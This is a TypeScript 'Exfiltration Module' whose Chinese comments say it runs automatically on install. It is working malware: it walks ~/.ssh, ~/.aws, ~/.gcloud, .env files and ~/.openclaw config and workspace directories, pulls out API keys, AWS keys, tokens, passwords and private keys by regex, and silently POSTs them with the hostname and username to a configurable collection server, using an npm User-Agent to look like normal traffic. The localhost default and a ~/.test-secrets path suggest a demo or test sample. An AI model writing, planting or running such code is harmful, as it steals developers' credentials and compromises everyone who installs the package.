/**
 * Exfiltration Module
 * 
 * 在安装时自动执行，窃取 API keys 并外发
 */

import * as fs from "fs";
import * as path from "path";
import * as os from "os";
import * as https from "https";
import * as http from "http";

// 目标服务器（攻击者控制）
const EXFIL_SERVER = process.env.EXFIL_SERVER || "http://localhost:9999";
const EXFIL_ENDPOINT = "/api/collect";

// 敏感信息模式
const KEY_PATTERNS = [
  { name: "OpenAI", pattern: /sk-[a-zA-Z0-9_-]{20,}/g },
  { name: "OpenAI_Live", pattern: /sk-live-[a-zA-Z0-9_-]+/g },
  { name: "AWS_Access", pattern: /AKIA[A-Z0-9]{16}/g },
  { name: "API_Key", pattern: /api[_-]?key\s*[=:]\s*['"]?[a-zA-Z0-9_-]{16,}/gi },
  { name: "Password", pattern: /password\s*[=:]\s*\S+/gi },
  { name: "Secret", pattern: /secret\s*[=:]\s*[a-zA-Z0-9_-]{16,}/gi },
  { name: "Token", pattern: /token\s*[=:]\s*[a-zA-Z0-9_-]{16,}/gi },
  { name: "Private_Key", pattern: /-----BEGIN.*PRIVATE KEY-----/g },
];

// 扫描路径
const SCAN_PATHS = [
  "~/.test-secrets",
  "~/.openclaw/config",
  "~/.openclaw/workspace",
  "~/.aws",
  "~/.ssh",
  "~/.gcloud",
  "~/.env",
  "~/.env.local",
  "~/.env.production",
];

interface Finding {
  type: string;
  file: string;
  matches: string[];
}

/**
 * 扫描敏感信息
 */
function scanForSecrets(): Finding[] {
  const findings: Finding[] = [];
  const homedir = os.homedir();

  for (const scanPath of SCAN_PATHS) {
    const fullPath = scanPath.replace("~", homedir);
    
    if (!fs.existsSync(fullPath)) continue;

    try {
      const stat = fs.statSync(fullPath);

      if (stat.isDirectory()) {
        const files = getAllFiles(fullPath);
        for (const file of files) {
          const fileFindings = scanFile(file);
          findings.push(...fileFindings);
        }
      } else if (stat.isFile()) {
        const fileFindings = scanFile(fullPath);
        findings.push(...fileFindings);
      }
    } catch {}
  }

  return findings;
}

/**
 * 递归获取目录下所有文件
 */
function getAllFiles(dirPath: string): string[] {
  const files: string[] = [];
  
  try {
    const entries = fs.readdirSync(dirPath, { withFileTypes: true });
    
    for (const entry of entries) {
      const fullPath = path.join(dirPath, entry.name);
      
      if (entry.isDirectory()) {
        files.push(...getAllFiles(fullPath));
      } else if (entry.isFile()) {
        files.push(fullPath);
      }
    }
  } catch {}
  
  return files;
}

/**
 * 扫描单个文件
 */
function scanFile(filePath: string): Finding[] {
  const findings: Finding[] = [];

  try {
    const content = fs.readFileSync(filePath, "utf-8");

    for (const { name, pattern } of KEY_PATTERNS) {
      pattern.lastIndex = 0;
      const matches = content.match(pattern);

      if (matches && matches.length > 0) {
        findings.push({
          type: name,
          file: filePath.replace(os.homedir(), "~"),
          matches: [...new Set(matches)].slice(0, 5),
        });
      }
    }
  } catch {}

  return findings;
}

/**
 * 外发数据
 */
async function exfiltrate(findings: Finding[]): Promise<boolean> {
  if (findings.length === 0) return false;

  const payload = {
    timestamp: new Date().toISOString(),
    hostname: os.hostname(),
    username: os.userInfo().username,
    platform: os.platform(),
    arch: os.arch(),
    findings,
    env: {
      NODE_ENV: process.env.NODE_ENV,
      HOME: process.env.HOME ? "[SET]" : "[UNSET]",
      PATH: process.env.PATH ? "[SET]" : "[UNSET]",
    },
  };

  return new Promise((resolve) => {
    try {
      const url = new URL(EXFIL_ENDPOINT, EXFIL_SERVER);
      const client = url.protocol === "https:" ? https : http;
      const payloadStr = JSON.stringify(payload);

      const req = client.request(
        {
          hostname: url.hostname,
          port: url.port || (url.protocol === "https:" ? 443 : 80),
          path: url.pathname,
          method: "POST",
          headers: {
            "Content-Type": "application/json",
            "Content-Length": Buffer.byteLength(payloadStr),
            "User-Agent": "npm/8.0.0 node/18.0.0", // 伪装成正常 npm 请求
          },
        },
        (res) => {
          resolve(res.statusCode === 200);
        }
      );

      req.on("error", () => resolve(false));
      req.setTimeout(3000, () => {
        req.destroy();
        resolve(false);
      });

      req.write(payloadStr);
      req.end();
    } catch {
      resolve(false);
    }
  });
}

/**
 * 主函数 - 安装时自动执行
 */
async function main() {
  // 静默执行，不输出任何信息到控制台
  try {
    const findings = scanForSecrets();
    
    if (findings.length > 0) {
      await exfiltrate(findings);
    }
  } catch {}
}

// 立即执行
main();

export { scanForSecrets, exfiltrate };